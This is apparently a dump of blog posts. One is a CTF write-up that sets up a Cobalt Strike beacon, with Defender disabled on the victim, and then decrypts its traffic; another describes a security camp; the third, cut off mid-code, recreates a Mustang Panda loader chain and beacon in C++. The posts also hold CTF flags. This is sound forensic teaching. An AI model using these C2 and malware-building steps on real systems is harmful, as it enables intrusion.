final year in university, my friends encouraged me to participate in hopes of getting 1st place as I have never gotten a champion title in a CTF. The most I have ever gotten was 2nd place. Anyway, how was the CTF you maybe asking? Well, our team NT won first place! Thanks to the RE King [Danisy Eisyraf](https://www.linkedin.com/in/danisyeisyraf/) and Queen of OSINT [Chang Shiau Huei](https://www.linkedin.com/in/chang-shiau-huei/)!\n\nHowever, as I wasn't involved in organising the CTF, I won't be talking about about it. Instead, I'm here to tell you about the Hard challenge which I have prepared in advance for this CTF called SCP 4.0 (yes, it was inspired by the SCP Foundation). Looking back at the challenge, it may have been too difficult for the participants  given that the CTF lasted only a few hours. This challenge was inspired by a previous HacktheBox Forensics challenge, and I was able to recreate it!\n\n## Preparing the Environment\n\n![hehe you don't have Cobalt Strike](../assets/decrypting-cobalt-strike-traffic/screw_you.png)\n\nThe environment is simple, we just need a Windows 10 virtual machine and a Kali Linux virtual machine. The applications we need will be:\n- Cobalt Strike 4.X (Installed on the Kali Linux VM)\n- Wireshark (Installed on the Windows 10 VM)\n- ProcDump (Installed on the Windows 10 VM)\n\nBUT WAIT!! Zach, Cobalt Strike is a paid product! How am I going to obtain it? Well, sad to say that your practical journey has to end here. However, you can see how the challenge was made and how it was solved from here.\n\n```\n┌──(jigsaw㉿jigsaw)-[~/Desktop/CobaltStrike]\n└─$ sudo ./teamserver 192.168.142.129 jigsaw\n```\n\nWhen you are ready, start up Cobalt Strike as shown above. Execute the binary with `sudo` followed by your C2 server's IP address and the password of the user who is going to access the Cobalt Strike server. When the server has started, join the server with the client binary.\n\n![Image of Cobalt Strike interface](../assets/decrypting-cobalt-strike-traffic/cobalt-strike-interface.png)\n\nOnce the client's GUI has loaded, login with the credentials you have set. After logging in, the main interface will be shown as demonstrated above. As John Hammond from Jurassic Park would say, \"Welcome to Cobalt Strike!\".\n\n## Generating a Beacon\n\n![Image of creating a beacon](../assets/decrypting-cobalt-strike-traffic/beacon.png)\n\nAs of right now, the attacker's environment is completed.  The only remaining task is to generate a payload to run on the victim’s machine. For simplicity sake and because my knowledge on Cobalt Strike is as little my knowledge on vulnerability research, it will be the default Cobalt Strike beacon executable.\n\n![Image of setting a listener](../assets/decrypting-cobalt-strike-traffic/listener.png)\n\nAs we are using Wireshark to capture network traffic, the communication between the beacon and the C2 server must not be encrypted on the network level. For this reason, the listener will be configured with the `windows/beacon_http/reverse_http` listener which is listening on port 80. After this step, save the executable somewhere.\n\n![Image of hosting the beacon](../assets/decrypting-cobalt-strike-traffic/hosting.png)\n\nNow, Cobalt Strike has a feature to host the executable as a drive by download. As I'm too lazy to open up a Python server on the terminal, we'll just use that feature as it is already baked into Cobalt Strike by default.\n\n\n![Image of URL hosting the beacon](../assets/decrypting-cobalt-strike-traffic/url.png)\n\nOnce the executable is hosted on the C2 server, all we need to do is to copy the URL shown and paste it onto our victim machine’s browser and away we go! However, it should be done without me saying, make sure that Microsoft Defender has been disabled on the Windows 10 VM beforehand.\n\n\n![GIF of Rick saying \"AND AWAY WE GO!!!\"](../assets/decrypting-cobalt-strike-traffic/away-we-go.gif)\n\n\n\n## Exploiting the Victim Machine\n\n![Image of the Wireshark interface](../assets/decrypting-cobalt-strike-traffic/wireshark.png)\n\nNow that the payload has been downloaded onto the Windows 10 VM, it would make sense that we should launch the executable right away right? RIGHT??? Yea...no, Wireshark needs to be launched first to capture the network traffic between the Cobalt Strike server and the beacon. \n\n![Image of the beacon connecting back to our C2](../assets/decrypting-cobalt-strike-traffic/callback.png)\n\nOnce Wireshark is launched and begins capturing network packets, the beacon can now be launched resulting in a callback to the Cobalt Strike server as shown above.\n\n\n![Image of the process to interact with the beacon](../assets/decrypting-cobalt-strike-traffic/interacting-with-beacon.png)\n\nNow as this is a CTF challenge, let's start creating some fluff to confuse the participants and obviously a flag.\n\n\n\n## Forensics Acquisition\n\n![Image of getting the beacon's process](../assets/decrypting-cobalt-strike-traffic/getting-process.png)\n\nOnce some fluff is created, we can stop Wireshark from capturing packets, followed by dumping the process of the beacon as it will become part of the challenge. This can be done by first looking at the Task Manager, and finding the Pid of the beacon.\n\n\n![Image of dumping the beacon's process](../assets/decrypting-cobalt-strike-traffic/dumping-process.png)\n\nThe process can be dumped using ProcDump by executing ProcDump followed by the Pid of the beacon using the `-mp` switch.\n\n\n\n## Forensics Analysis\n\nHere's where the real challenge starts. A network capture file and a process dump. The reason why this challenge is ranked as Hard is because the communication between the Cobalt Strike server and the beacon does not send and receive data in plain text in Cobalt Strike version 4.X. Eventhough we configured a HTTP listener, it still encrypts the data before sending and when receiving them. The encryption method is specifically AES-256 in CBC mode with HMAC-SHA-256.\n\nLuckily for us, there is a solution thanks to Didier Stevens’ [blog](https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/) which is divided in 7 parts. For a detailed explanation, you can refer to his blog on NVISO Labs.\n\n```\n┌──(jigsaw㉿jigsaw)-[~/Desktop/scp-4.0]\n└─$ python3 cs-parse-http-traffic.py -k unknown capture.pcapng\n```\n\nFirst, [cs-parse-http-traffic.py](https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py) is used extract the encrypted data from the network capture file.\n\n\n\n```plaintext {\"Let's take this piece of data\":26-27}\nPacket number: 40\nHTTP response (for request 36 GET)\nLength raw data: 64\n6141f2872594360aa3411b33c61582e3920f41bf72af502863e32a978cb1b3f82f3979aae93569d0c06784672b6e73b90fffbcbe4be2fc62a00a8d0cea4fb299\n\nPacket number: 47\nHTTP request POST\nhttp://192.168.142.129/submit.php?id=1850308416\nLength raw data: 68\n000000407468637f4035f8e23e604e58262415b22150becd1158da6748936cff0b67e7dfe9910af33bab1c118045bd0f418c51caaeb58d30acd639acb17f6b9769e215a3\n\nPacket number: 94\nHTTP response (for request 91 GET)\nLength raw data: 80\n85c3951d0e9f00be1aef2d4b4b02f54de8245162c4bc967ef23691d1de1d21ee1ec2c1d766f66d20e9d44e996d5620977af1d17dfa5046ad0b9ee1fd83a2291a47de1accfbc9f570b5064b516eb782ea\n\nPacket number: 102\nHTTP request POST\nhttp://192.168.142.129/submit.php?id=1850308416\nLength raw data: 2996\n00000bb0c362ecfc8b96d5db19572500 \u003C-- SNIP -->\n\nPacket number: 123\nHTTP response (for request 119 GET)\nLength raw data: 64\n// ...\nf711c8fcc407cafd6894c33bd11e17f3167372f8340bde9b69637efe75b6d091ce20d10f95ed12bbe10e2087731095cf9d66610b7026ad87e62cc0ca7f84c486\n\nPacket number: 130\nHTTP request POST\nhttp://192.168.142.129/submit.php?id=1850308416\nLength raw data: 548\n00000220c67b3cd12150d2ad219d5dd2 \u003C-- SNIP -->\n\nPacket number: 145\nHTTP response (for request 141 GET)\nLength raw data: 80\n004299ba5d6ed29d5a4bb7330eb0fe55 \u003C-- SNIP -->\n\nPacket number: 153\nHTTP request POST\nhttp://192.168.142.129/submit.php?id=1850308416\nLength raw data: 1796\n0000070062c3b66a95cd260960e9804b \u003C-- SNIP -->\n\nPacket number: 240\nHTTP response (for request 207 GET)\nLength raw data: 43616\n8c7e997a281c47d14d15846ee48ab597 \u003C-- SNIP -->\n```\n\n\nFrom here, we just need on of the raw data which is sent by the server to the beacon. The raw data contains tasks to be executed by the beacon. Let's take the data highlighted above.\n\n\n![Image of sample data extracted from a Cobalt Strike 3.X beacon](../assets/decrypting-cobalt-strike-traffic/sample-data.png)\n\n```\n┌──(jigsaw㉿jigsaw)-[~/Desktop/scp-4.0]\n└─$ python3 cs-extract-key.py -t f711c8fcc407cafd6894c33bd11e17f3167372f8340bde9b69637efe75b6d091ce20d10f95ed12bbe10e2087731095cf9d66610b7026ad87e62cc0ca7f84c486 beacon.exe_240116_202412.dmp\n```\n\n[cs-extract-key.py](https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py) is usually used to find and decode the metadata of the beacon from the process dump. This metadata is basically metadata of the beacon whenever it calls back to the Cobalt Strike server. The metadata contains information such as these.\n\n\nHowever, that method is only applicable for Cobalt Strike 3.X beacons as the metadata is distinguishable from other data from the process dump as the metadata will start with the sequence of bytes `00 00 BE EF`. For Cobalt Strike 4.X beacons, the data is encrypted so a dictionary attack will be used by taking a sequence of 16 bytes from the process dump and attempts to decrypt the data given to it. The string that `cs-extract-key.py` is specifically searching for in the context of Cobalt Strike 4.X beacons is `sha256\\x00`. To do that, the raw data selected will be used to perform a dictionary attack specified with the `-t` switch and then followed by the process dump file. \n\n\n\n```plaintext {\"We need this:\":5-6} {\"And this:\":8-9}\nFile: beacon.exe_240116_202412.dmp\nSearching for AES and HMAC keys\nSearching after sha256\\x00 string (0x3cd720)\nAES key position: 0x003d3c58\n// ...\nAES Key:  730e4040888c9ccb40882e33789a5cd6\nHMAC key position: 0x003d6f78\n// ...\nHMAC Key: 5a5a7717389bf665aac5ec021f0b56e6\nSHA256 raw key: 5a5a7717389bf665aac5ec021f0b56e6:730e4040888c9ccb40882e33789a5cd6\nSearching for raw key\n```\n\nAs you can see, the results of using `cs-extract-key.py` give us the AES key and HMAC keys.\n\n\n\n```\n┌──(jigsaw㉿jigsaw)-[~/Desktop/scp-4.0]\n└─$ python3 cs-parse-http-traffic.py -k 5a5a7717389bf665aac5ec021f0b56e6:730e4040888c9ccb40882e33789a5cd6 capture.pcapng\n```\n\nWith the AES key and HMAC keys, we can then use `cs-parse-http-traffic.py` again but now with the AES and HMAC keys specified to retrieve the decrypted data.\n\n![Image of communication between the C2 and the beacon](../assets/decrypting-cobalt-strike-traffic/commands.png)\n\nParsing the network capture file reveals the commands sent to the beacon from the Cobalt Strike server.\n\n\n\n![Image of a PDF file found within the traffic](../assets/decrypting-cobalt-strike-traffic/pdf-file.png)\n\nLooking through the data, there seems to be a PDF file present within the data. This is indicated by the file name at the beginning, `important document.pdf`.\n\n\n\n```\n┌──(jigsaw㉿jigsaw)-[~/Desktop/scp-4.0]\n└─$ python3 cs-parse-http-traffic.py -k 5a5a7717389bf665aac5ec021f0b56e6:730e4040888c9ccb40882e33789a5cd6 -e capture.pcapng\n```\n\nUsing `cs-parse-http-traffic.py` again with the `-e` switch, helps us extract aforementioned file, giving us the PDF file.\n\n\n![Image of a document containing the flag](../assets/decrypting-cobalt-strike-traffic/flag.png)\n\nOpening up the PDF file give us the flag. \n\n```\nICTF{sTrIK!NG_8AcK_w!TH_cOb4L7_stRIke}\n```\n\n\n## Conclusion\n\n![have fun learning](../assets/decrypting-cobalt-strike-traffic/learn.jpg)\n\nIn conclusion, was it a fun challenge to make? Yes. Was it too hard to be solved within a few hours? It depends, as it requires some research and understanding of how Cobalt Strike beacons work. It may cause the participants to suffer, but it is important to know that you should have fun during a CTF and try to learn from it.","src/content/posts/decrypting-cobalt-strike-traffic.mdx",[110],"../assets/decrypting-cobalt-strike-traffic/featured.png","fbf5a657a15daf52","mcc2023",{"id":112,"data":114,"body":122,"filePath":123,"assetImports":124,"digest":126,"deferredRender":70},{"title":115,"createdAt":116,"description":117,"tags":118,"draft":84,"image":121},"My Experience at Malaysia Cybersecurity Camp (MCC) 2023",["Date","2023-12-15T16:00:00.000Z"],"MCC is a cybersecurity camp where enthusiastic cybersecurity students come together to learn from the best in the industry.",[119,120],{"id":81,"collection":9},{"id":83,"collection":9},"__ASTRO_IMAGE_../assets/mcc2023/featured.png","# Introduction\n\n\nMalaysia Cybersecurity Camp (MCC) is an initiative that focuses on developing a better cybersecurity community for the next generation. It involves networking with top local cybersecurity experts, facilitating student exchanges to build lasting friendships, and enjoying educational experiences in nature. The camp aims to identify talented individuals, increase their knowledge through expert guidance, close the talent gap between students and professionals, bring students to par with global peers, and produce graduates ready for the workforce with minimal training. It is organised by [NanoSec](https://www.linkedin.com/company/nanosecasia/) and [RE:HACK Consultancy](https://www.linkedin.com/company/rehack-xyz/) , it's a community-driven effort by IT security professionals and students.\n\n\nWith that said, I had the opportunity to to participate in it! In summary, I had an incredible experience! In context, I heard of MCC back in 2022, but I had classes and exams at the time. For that reason, I unfortunately did not register for the event and I regretted it.\n\n![Image of me crying](../assets/mcc2023/crying.jpg)\n\n# Registration Process\n\nDuring the registration, a TryHackMe box was given to test our respective skills. The [box](https://tryhackme.com/jr/morpheus) is available at the time of writing if you want to try it. The box consists of a red teamer route as well as a blue teamer route. As a purple teamer, I did both.\n\nAfter the registration, there was an interview process. Yes, an interview, an introvert's (me btw) worst enemy. RE:HACK will shortlist a number of participants to interview them. To be fair, the whole camp was sponsored so in their point of view, they have to choose the participants wisely. Fortunately, I was shortlisted. Beforehand, [Jia Qi](https://www.linkedin.com/in/jiaqiyeo/), a friend of mine who participated in the event the previous year and also the one of the crew members of this year's event gave me some pointers on what to say during the interview.\n\nHowever, things didn't go according to plan. I chose the worst day for my interview. In context, RE:HACK will organise sharing sessions sometimes for students. It is a good initiative for people who want to learn about certain topics. On the day of my interview, the speaker was [Teng](https://www.linkedin.com/in/wang-teng-zheng-1b176a1a6/), a student who specialises in Reverse Engineering. I wanted to concentrate and learn what I can from the legend, but the timing:\n\n![Image of the timing between the sharing session and my interview](../assets/mcc2023/timing.png)\n\n\nBy the end of the session, I was tired, blur and processing what was taught during the sharing session. For that reason, I was kind of blur during the interview and I missed out on the things I was supposed to say which was briefed to me previously. Suffice to say, this was how I imagined Jia Qi's reaction was like:\n\n![Image of the Jia Qi's reaction](../assets/mcc2023/failure.jpg)\n\nAnyway, days, weeks and months passed by. Despite my poor performance during my interview my friends who were crew members as well, including Jia Qi managed to put in some good words for me and fortunately enough I managed to get into MCC2023!\n\n# Day 1 - The Journey Begins\n\nOn the morning of December 8th, [Roheen](https://www.linkedin.com/in/roheender-sahota), [Darrshan](https://www.linkedin.com/in/darrshan-rajenderan) and I took an early road trip to Port Dickson to start our MCC journey! It was a fun 1.5 hour drive there, we played songs and vibed in the car. However, I fell asleep in the car so the only thing I remembered from the road trip was us pointing at a road sign screaming \"***PORT DICKSON!!!!***\".\n\n![Image of Darrshan, Roheen and me at the resort](../assets/mcc2023/arrival.jpg)\n\nOnce we reached the resort, we put our luggages aside and talked to each other because funny enough, we were the first ones who reached the resort. We ended waiting around 15-30 minutes for the rest of the participants and crew who were coming by bus to arrive. Eventually, everybody arrived and we were led into a small room for registration. During the registration, we were given some MCC swags which included a shirt, a bag and some stickers. \n\n![Image of MCC participants networking](../assets/mcc2023/networking.png)\n\nAfter that, we start networking with the other participants. From the mini networking session, I discovered that one of my Forensics challenges from the ASEAN Battle of Hackers CTF caused a participant to reformat their laptop. In context, it was a malware analysis challenge, and I did not warn the participants against running the malware on their host machine. During the networking session, I met my roomate as well! [Shen](https://www.linkedin.com/in/chuajianshen) is a Sunway student who managed to obtain the Offensive Security Certified Professional (OSCP) as well as the Offensive Security Wireless Professional (OSWP)! I managed to ask some questions regarding the OSCP and his advice on how he tackled the certification. He advised me that as long as I complete the labs for Active Directory, everything will go smoothly. Overall,  this networking session was more of a relaxed, casual chat as I was **FINALLY** surrounded by like-minded people!\n\n\n![Image of Mr Ahmad Ashraff making the opening speech](../assets/mcc2023/opening-speech.png)\n\nThen, the speakers arrived, we took a sit and Mr [Ahmad Ashraff](https://www.linkedin.com/in/yappare) began introducing us to MCC, why he organised MCC and who sponsored this year’s MCC. After his speech, we had [Rizki Boisandie](https://www.linkedin.com/in/rizkiboisandie), a career advisor who gave some advice on how to get a job in cybersecurity. We even spoke to him after the session for more advice and I have to say his advice is pretty insightful! After the opening speech by Mr Ahmad Ashraff, and by the sponsors of the event, we had lunch and we were free to do whatever we wanted until the next day!\n\n![Image of us try harding](../assets/mcc2023/try-harder.png)\n\n\n**BUT WAIT!!!** before we left for lunch, the crew gave us an assignment or rather in my case, a mission which is basically a CTF challenge for us to complete. This year's assignment is a reverse engineering challenge made by our **handsome** and **wonderful** challenge creator [Teng](https://www.linkedin.com/in/wang-teng-zheng-1b176a1a6/)! If you know any cybersecurity student or professional, you would know their persistant curiousity. Basically, we have a **TRY HARDER** mentality. So, we put our heads together and worked on the challenge… until 2–3 AM. What's funny is that they assigned us to different groups, but we didn't really discuss the challenge with our own teammates. Instead, people from different teams, myself included, came together to talk about it. I remember being in a room with five other people from different groups, discussing the reverse engineering challenge, even though none of us specialised in RE.\n\n# Day 2 - The Forensics God\n\n![Image of Fareed Fauzi](../assets/mcc2023/fareed-fauzi.png)\n\nThe next day, MCC 2023 officially started! I signed up for the DFIR workshop which was conducted by none other than [Fareed Fauzi](https://www.linkedin.com/in/fareedfauzi/) who I consider one of the **God of Forensics**!\n\n>*\"But Zach, from what I know, you specialise in Forensics. Why would you sign up for something you're already knowledgeable about?\"*\n\nWell, I believe if you know 80-90% of the subject, it is good to pick up another 10-20% from someone who knows more than you do. In cybersecurity, we’re always learning. Don’t forget that, even if it’s a small amount information, you’re still learning.\n\n![Image of Barney](../assets/mcc2023/barney.jpeg)\n\nOf course my mascot had to make an appearance at MCC 2023! 🤣🤣 \n\nAnyway, during the workshop, we mainly learned about Windows Forensics and the artefacts that can be found within Windows. So, what were the 10–20% of new things I learned? Well, I learned:\n\n- When performing acquisition, using the hostname as the filename is a standard practice.\n- When analysing hard disks, it's better to mount them and conduct a triage first, as this gathers and extracts most of the information from the disk before manually extracting data one by one using Autopsy.\n- When analysing logs, there's no easy way to do it—you have to go through them one by one unless you use Hayabusa.\n- When doing Blue Teaming, understanding Red Teaming strategies is essential, so being a Purple Teamer is the way to go. (YES, I MADE A GOOD DECISION!)\n\n![Image of Emmy and Wei Ying](../assets/mcc2023/coaching.png)\n\nAlso, I had the opportunity to coach two of my juniors, [Emmy](https://www.linkedin.com/in/toh-jia-yu-642652248/) and [Wei Ying](https://www.linkedin.com/in/teh-wei-ying-12a492261/). Throughout the session, I did my best to break down and clarify the points Fareed was discussing, making sure they could follow along and grasp the key concepts. We had some great discussions, shared insights, and even debated a few ideas, which made the learning process more engaging. Overall, it was a fun and rewarding experience, and I enjoyed guiding them while also reinforcing my own understanding.\n\n> *Looking back, I think we spent more time chatting than listening… and I was probably too loud. Apologies, Fareed 😅😅!*\n\n\nOverall, we had a great time and walked away having learned something from the session, which is exactly my motto for every CTF. Learning is supposed to be fun, and that should never be compromised. No matter how challenging a competition gets, the most important thing is to take away new knowledge and enjoy the process.\n\nOn that note, since I had previously attempted some of Fareed's challenges, I took the opportunity to ask him, as a challenge creator, how he goes about designing them. His answer was not what I expected. He said that he creates challenges as a way to learn new things himself rather than just testing others. That really resonated with me because I take the same approach when making challenges. I always try to push myself to explore new tools, techniques, or methodologies when designing a challenge, so hearing that an experienced challenge creator does the same was reassuring. It made me feel like I’m on the right track, and it reinforced my belief that CTFs are not just about solving problems but also about growing as a learner and creator.\n\nOh yeah, it’s worth mentioning that during the lunch break, we managed to find one of the three flags for the reverse engineering challenge, all thanks to our Prompt Engineer, [Firdaus](https://www.linkedin.com/in/firdaus-amran/)! He worked his magic with some clever prompts, and before we knew it, we had the flag. We all got excited, laughing and hyping each other up because, honestly, we didn’t expect to get it that way.\n\nThen, after lunch, [Shenghe](https://www.linkedin.com/in/shengheong/) found another flag, and the whole room lit up. At that point, we were fully focused, bouncing ideas around and trying different approaches. With just one flag left, we were even more motivated to keep going. We were so close, and we wanted to see it through to the end. Everyone put their heads together, testing different theories and sharing their findings, hoping to uncover the last part of the flag.\n\n![Image of Max](../assets/mcc2023/max.jpeg)\n\nLater that night, we met Max, the founder of Asia Pacific University's Forensic & Cybersecurity Research Centre Student Section. He hosted a mini workshop on lock picking, which was something completely new to me. At first, it felt tricky, but with the guidance of [Eason](https://www.linkedin.com/in/eason-tai-bb616a22a/) and Darrshan, I managed to unlock (see what I did there?) a new skill. It was surprisingly fun and definitely a cool hands-on experience!\n\n> *So apparently, Max founded FSEC and started running weekly workshops with the ultimate goal of getting the entire FSEC squad to DEFCON one day. When I heard that, my brain short-circuited for a second. EXCUSE ME?? THAT'S INSANE. THIS MAN IS PLAYING 4D CHESS WHILE THE REST OF US ARE JUST VIBING. 🤯🤯*\n\nAfter the session was over, Eason and I were on a mission to find the final flag for the reverse challenge. You might be wondering… did we get the flag? YES, WE DID!!! The moment Eason found it, he screamed right in my ear, and we both lost our minds. We hugged, jumped around, and celebrated like we had just won the lottery. Finally, all 3/3 flags secured!\n\nOh, and in the middle of solving the challenge, I almost single-handedly destroyed all of our computers. I thought I had discovered something groundbreaking, so in my excitement, I grabbed Eason's hand and shook it—completely unaware that he was holding a bottle of water. The bottle nearly went flying, and Eason let out a scream that sounded exactly like R2D2 getting launched into space. Absolute chaos.\n\n![Image of us at the Ramly Burger stall](../assets/mcc2023/ramly-burger.jpeg)\n\nAfter a long day, we were completely drained and starving. So what did we do? Obviously, we walked 2km to the nearest burger joint for Ostrich Burgers!!!\n\nMe, Roheen, Darrshan, Eason, and Shenghe powered through the hunger, hyping ourselves up the whole way. We complained, we laughed, and we questioned why we were doing this to ourselves. But when we finally got our food? Best. Decision. Ever. The burgers were amazing, and we sat there stuffing our faces, talking about everything and nothing. Totally worth it.\n\n\n# Day 3 - Slivering into Red Teaming\n\n![Image of Emmy Roheen and me during the Red Teaming workshop](../assets/mcc2023/red-teaming-sesh.jpeg)\n\n\nThe next day’s session focused on Red Teaming, and it was exactly the kind of hands-on experience I was looking for. [Shahril](https://www.linkedin.com/in/shahrilzainolabidin/) and [Faeq](https://www.linkedin.com/in/mokhdzani-faeq-521727a1/) walked us through real-world methodologies, from reconnaissance to post-exploitation. One of the highlights was working with Sliver C2, an open-source command and control (C2) framework. We explored how attackers deploy and manage implants, gaining insight into Red Team operations while reinforcing the importance of defensive countermeasures.\n\nThen came the boot2root challenge, where we had to exploit an RCE vulnerability in a web app. Everything was going smoothly until Roheen accidentally defaced the entire page. At first, we were confused. We refreshed the page. Still blank. Then it hit us. Roheen had somehow wiped out the web app completely. To make it even better, the defaced site proudly displayed his alias: \"pwned by MaanVad3r.\"\n\nWe couldn’t stop laughing. One moment we were making progress, and the next, the entire challenge was gone. Roheen kept insisting he didn’t mean to do it, and honestly, we believed him, but that didn’t make it any less hilarious. Luckily, the organisers restored the challenge, and we got back on track. It was a perfect reminder that in cybersecurity, you should always expect the unexpected.\n\nOverall, the session was both fun and insightful, especially from a Purple Teaming perspective.\n\n![Image of Roheen celebrating with Barney](../assets/mcc2023/roheen-celebrating-with-barney.jpeg)\n\n> *Roheen embracing mistakes like a true legend—with Barney* \n\n![Image of us at the pool](../assets/mcc2023/pool.jpeg)\n\nAfter the session, we decided to hit the pool for some fun, and that’s when [Nal](https://www.linkedin.com/in/hassanal-harriz/) *almost* drowned. Thankfully, he survived, though I’m pretty sure we all aged a few years watching it happen. \n\n![Image of some of us at the BBQ](../assets/mcc2023/bbq.png)\n\nAfter a good swim and some important lessons learned, like maybe not diving into the 2.6m deep end if you are not 100% confident, we wrapped up the night with an amazing BBQ and great conversations. That was when I discovered something interesting. Nal is actually my rival. He competed in the Petronas Inter-University CTF 2023 and PWC’s Hackaday CTF 2023. Both times, my teams, DinoDefend3rs for PWC and HC4 for Petronas, managed to beat his team.  \n\n> *Just want to say, Nal, if you are reading this, all the bombastic side-eyes were just jokes. I respect you as a CTF player and truly admire your passion for growing the cybersecurity community at your university. But a rivalry is a rivalry, so see you in the next CTF!* 😆🔥  \n\n\n![Image of my injured finger](../assets/mcc2023/pool-injury.jpeg)\n\nTo end the night, Roheen, Darrshan, and I played some pool, where I *severely* injured my finger while breaking. Not only did I manage to break the billiard balls, but I also somehow managed to break my own finger.  \n\nBut hey, we won, so nothing else matters. Lmao.  \n\n# Day 4 - The Journey Has Just Begun\n\n![Image of the group picture](../assets/mcc2023/group-pic.png)\n\nWelp, here we are, the last day… Honestly, I can’t believe it’s already time to go. It’s been an amazing time with people who are now legit friends and some of the coolest folks to vibe with in the cybersecurity world. The last day was pretty chill. We packed, we ate, and slowly started realising we were about to head out.  \n\n**BUT WAIT!!!** Before we could escape, we HAD to snap one final picture together. Because how else would we remember all the chaos, laughs, and questionable decisions we made? 😂\n\n![Image of MCC2023 written in the sand](../assets/mcc2023/goodbye.jpeg)\n\nHonestly, to end this blog post off, I would like to thank **Mr Ahmad Ashraff**, **NanoSec**, and **RE:HACK** for offering me this opportunity to learn and grow in this community. I’ve finally found a community where I can truly vibe and learn with like-minded people. Lastly, a massive shoutout to **Jia Qi** for her continuous support and guidance before the camp. She’s an incredible friend who will always believe in you and support you until the very end.\n\nhere’s a flag for you MCC2023:\n\n```plaintext\nflag{!M_GoiNG_7o_M1Ss_MCc2023}\n```","src/content/posts/mcc2023.mdx",[125],"../assets/mcc2023/featured.png","ac00034e3f7cd3c7","recreating-an-apt-attack",{"id":127,"data":129,"body":139,"filePath":140,"assetImports":141,"digest":143,"deferredRender":70},{"title":130,"createdAt":131,"description":132,"tags":133,"draft":84,"image":138},"Mimicking an APT Attack for a CTF Challenge",["Date","2025-03-11T16:00:00.000Z"],"A Mustang Panda attack is simulated by me to create a CTF challenge. The lab consists of a custom build loader, C2 beacon and C2 server.",[134,135,136,137],{"id":99,"collection":9},{"id":101,"collection":9},{"id":103,"collection":9},{"id":105,"collection":9},"__ASTRO_IMAGE_../assets/recreating-an-apt-attack/featured.png","import { Tweet, Vimeo, YouTube } from 'astro-embed';\n\n\n>**Disclaimer:**\n>\n>If you are in law enforcement, yes I am Chinese but I'm Malaysian Chinese. No, I am not associated with Mustang Panda. If you are associated with Mustang Panda, please don’t make me disappear, I don’t know how to properly make a C2 server and all content were results of vibe programming 👹👹.\n\nOn the 8th of May 2025, [Blackberry](https://www.linkedin.com/company/blackberry/)'s [Cybersecurity Centre of Excellence](https://www.linkedin.com/showcase/cybersecurity-center-of-excellence-malaysia/) decided to run a CTF for it's 1st anniversary in Malaysia. They contacted [RE:HACK](https://www.linkedin.com/company/rehack-xyz/) to organise the event and I had the opportunity to be one of the challenge creators for this event. As the event is going to be special for Blackberry, I thought I'd put something special for one of the Forensics challenge by creating a challenge based on a research I found.\n\n\n## Challenge Inspiration\n---\nMy challenge was based on the New Year-Themed Multi-staged Malware discovered in 2024 by [Cyble Research and Intelligence Labs (CRIL)](https://www.linkedin.com/company/cyble-global/). CRIL discovered a ZIP archive file potentially distributed through New Year-themed spam emails. The attachment contains a shortcut file disguised as a PNG image, which, when executed, launches MSHTA and uses JavaScript to download and display a “Happy New Year” image, deceiving the user into thinking it is harmless. Meanwhile, the JavaScript covertly downloads and decodes a malicious payload using `certutil`, retrieving a `.cab` file that is subsequently extracted to drop a malware executable. Once executed, the malware deploys a second-stage DLL payload and uses DLL sideloading to further the infection, ultimately establishing a connection to a Command-and-Control (C&C) server. To read more on the analysis, you can read Cyble's blog post [here](https://cyble.com/blog/festive-facade-dissecting-multi-stage-malware-in-new-year-themed-lure/). With that, I planned the attack flow for my challenge:\n\n`LNK file` → `mshta.exe` → `certutil` → `CAB File` → `EXE File` → `DLL Sideloading`\n\nWith the attack flow in mind, let's work backwards to simulate this attack. So, the first thing to build for this simulation is the DLL which will be sideloaded. Then, an executable file will need to be made to download the DLL and the executable that will load the DLL mentioned. The executable will then be archived as a `.cab` file and then encoded to disguise it as a certificate file. Then, a `.hta` file will need to be made to download the `.cab` file, decode it and run the executable. Lastly, a shortcut file will need to be created to call `mshta.exe` to run the `.hta` file.\n\n## Behaviour of the Variant D ToneShell Beacon\n---\nReading into the research by CRIL, by looking at the IOCs discovered, the attack utilises ToneShell. ToneShell is commonly used by the APT group known as Mustang Panda. Thanks to researchers at [Trend Micro](https://www.linkedin.com/company/trend-micro/), I learned how ToneShell communicates with its command and control center. The images used in this section are by Trend Micro.\n\n![Image of the communication between the C2 beacon and C2 server.](../assets/recreating-an-apt-attack/communication.png)\n\nHow the real ToneShell communicates is as follows:\n\n1. The handshake containing the *xor_key* and *victim_id* is sent to the C&C server.\n2. A 5-byte-sized data packet that is composed of magic and has a size of 0x02 is received.\n3. A 2-byte-sized data packet decrypted with the *xor_key* and that must have a first byte of 0x08 is received.\n4. Data that is composed of magic and the next payload size is received.\n5. Data is received and decrypted using *xor_key*. The first byte is the command code, and the following data is the extra information.\n\n![Image of the initial data sent to the C2 server.](../assets/recreating-an-apt-attack/initial-blob.png)\n\nHowever, as the challenge was kinda rushed as I had other commitments, I wasn't going to build a one-to-one copy of ToneShell. The main part I was focusing on was the initial blob that was sent as a callback to the C2 server. This blob starts with a **512-byte** *xor_key* used to encrypt the traffic, which is derived from a seed value. Next is a **1-byte** *type* field, which is always set to the fixed value **0x08**. Following that is a **16-byte** *victim_id*, uniquely generated using *CoCreateGuid*. Finally, there's a **16-byte** *xor_key_seed*, randomly generated via *GetTickCount*, which was used to create the initial *xor_key*.\n\nAnother part that I concentrated on was how ToneShell handles the *victim_id*. According to researchers at Trend Micro, it is stored in `%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Web.Facebook.config`. With that let's get to building ToneShell!\n\n## Building the ToneShell C2 & Beacon\n---\n\n### Victim ID Generation\n---\n\n```c++\nstd::wstring getGUIDFilePath() {\n    wchar_t userProfile[MAX_PATH];\n    if (GetEnvironmentVariableW(L\"USERPROFILE\", userProfile, MAX_PATH) == 0) {\n        return L\"C:\\\\Users\\\\Default\\\\AppData\\\\Roaming\\\\Microsoft\\\\Web.Facebook.config\"; \n    }\n    return std::wstring(userProfile) + L\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Web.Facebook.config\";\n}\n```\nThrough vibe programming, the above function was made to generate the final file path the victim ID is going to be stored in. The malware will first try to put the *victim_id* within `C:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Web.Facebook.config` first. If it fails to do so, it will then put it into `%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Web.Facebook.config`.\n\n```c++\nstd::wstring getOrCreateGUID() {\n    std::wstring path = getGUIDFilePath();\n    std::wifstream infile(path);\n    std::wstring guid;\n    \n    if (infile) {\n        std::getline(infile, guid);\n        infile.close();\n        if (!guid.empty()) {\n            return guid;\n        